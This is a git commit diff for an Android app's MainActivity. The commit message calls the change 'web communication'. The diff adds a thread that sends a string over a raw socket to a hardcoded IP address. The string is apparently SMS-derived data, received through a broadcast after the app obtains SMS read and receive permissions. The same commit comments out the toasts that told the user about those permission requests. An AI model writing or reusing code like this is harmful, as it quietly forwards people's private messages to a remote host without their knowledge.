62ba9be906889d84a070c4d1bbb6a6f3b7a9200e
YuanGao <gaoyuan_hz@qq.com>
2019-09-22 14:52:19 -0700

    added a inner class to deal with web communication

--- MyApplication/app/src/main/java/com/example/myapplication/MainActivity.java
+++ MyApplication/app/src/main/java/com/example/myapplication/MainActivity.java
@@ -10,13 +10,17 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.pm.PackageManager;
-import android.net.Uri;
 import android.os.Bundle;
-import android.os.health.PackageHealthStats;
-import android.view.View;
 import android.widget.CompoundButton;
 import android.widget.Switch;
 import android.widget.Toast;
+
+import java.io.BufferedWriter;
+import java.io.IOException;
+import java.io.OutputStream;
+import java.io.OutputStreamWriter;
+import java.net.Socket;
+import java.net.UnknownHostException;
 
 public class MainActivity extends AppCompatActivity{
 
@@ -26,6 +30,35 @@ public class MainActivity extends AppCompatActivity{
 
     private MyReceiver myReceiver;
 
+    public String value = null;
+    public String message;
+
+    private MySocketThread myThread;
+
+    private class MySocketThread extends Thread{
+
+        private Socket socket;
+
+        @Override
+        public void run(){
+            try {
+                this.socket = new Socket("134.114.181.162", 10000);
+                this.socket.setSoTimeout(10000);
+                OutputStream os = this.socket.getOutputStream();
+                BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(os, "utf-8"));
+                bw.write(value);
+                bw.flush();
+                this.socket.close();
+            }
+            catch (UnknownHostException e){
+                e.printStackTrace();
+            }
+            catch (IOException e){
+                e.printStackTrace();
+            }
+        }
+    }
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -34,34 +67,47 @@ public class MainActivity extends AppCompatActivity{
         switch1.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
             @Override
             public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
-               if(isChecked == true){
+                if (isChecked == true) {
 
-                   Toast.makeText(MainActivity.this, "applying permission", Toast.LENGTH_LONG).show();
+                    //Toast.makeText(MainActivity.this, "applying permission", Toast.LENGTH_LONG).show();
 
-                   if(ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.RECEIVE_SMS)!=PackageManager.PERMISSION_GRANTED){
-                       Toast.makeText(MainActivity.this, "Permission must be granted to get sms", Toast.LENGTH_LONG).show();
-                       ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.RECEIVE_SMS}, 1);
-                       if(ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_SMS)!=PackageManager.PERMISSION_GRANTED){
-                           Toast.makeText(MainActivity.this, "Permission must be granted to get sms", Toast.LENGTH_LONG).show();
-                           ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.READ_SMS}, 1);
-                       }
-                   }
-                   else {
-                       Toast.makeText(MainActivity.this, "permission granted", Toast.LENGTH_LONG).show();
-                       //intentFilter.addAction("android.provider.Telephony.SMS_RECEIVED");
-                       //myReceiver = new MyReceiver();
-                       //registerReceiver(myReceiver, intentFilter);
-                       messageReceiver = new BroadcastReceiver(){
-                           @Override
-                           public void onReceive(Context context, Intent intent) {
-                               String value = getIntent().getStringExtra("name");
-                           }
-                       };
-                       registerReceiver(messageReceiver, new IntentFilter(CLOSE_ACTION));
-                   }
-               }
+                    if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) {
+                        //Toast.makeText(MainActivity.this, "Permission must be granted to get sms", Toast.LENGTH_LONG).show();
+                        ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.RECEIVE_SMS}, 1);
+                        if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
+                            //Toast.makeText(MainActivity.this, "Permission must be granted to get sms", Toast.LENGTH_LONG).show();
+                            ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.READ_SMS}, 1);
+                        }
+                    } else {
+                        //Toast.makeText(MainActivity.this, "permission granted", Toast.LENGTH_LONG).show();
+                        //intentFilter.addAction("android.provider.Telephony.SMS_RECEIVED");
+                        //myReceiver = new MyReceiver();
+                        //registerReceiver(myReceiver, intentFilter);
+                        messageReceiver = new BroadcastReceiver() {
+                            @Override
+                            public void onReceive(Context context, Intent intent) {
+                                Bundle bundle = intent.getExtras();
+                                value = bundle.getString("name");
+                                //Toast.makeText(context, value, Toast.LENGTH_LONG).show();
+                                //Intent intentTmp = new Intent(MainActivity.this, SocketActivity.class);
+                                //intentTmp.putExtra("extra_data", value);
+                                //startActivity(intentTmp);
+                                myThread = new MySocketThread();
+                                myThread.start();
+                            }
+                        };
+                        registerReceiver(messageReceiver, new IntentFilter("CLOSE_ACTION"));
+
+                    }
+                    Toast.makeText(MainActivity.this, "I'm here", Toast.LENGTH_LONG).show();
+                    if (value != null) {
+
+                    }
+                }
+                else{
+                    //Do something
+                }
             }
         });
     }
-
 }
